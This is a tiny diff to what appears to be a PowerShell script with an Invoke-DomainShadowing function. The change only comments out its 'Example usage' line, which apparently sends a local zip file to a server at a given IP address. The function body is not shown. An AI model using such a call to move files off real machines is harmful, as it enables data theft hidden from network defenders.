@@ -55,4 +55,4 @@ function Invoke-DomainShadowing {
 }
 
 # Example usage
-Invoke-DomainShadowing -FilePath "C:\path\to\your\file.zip" -ServerAddress "172.21.55.115"
+# Invoke-DomainShadowing -FilePath "C:\path\to\your\file.zip" -ServerAddress "172.21.55.115"
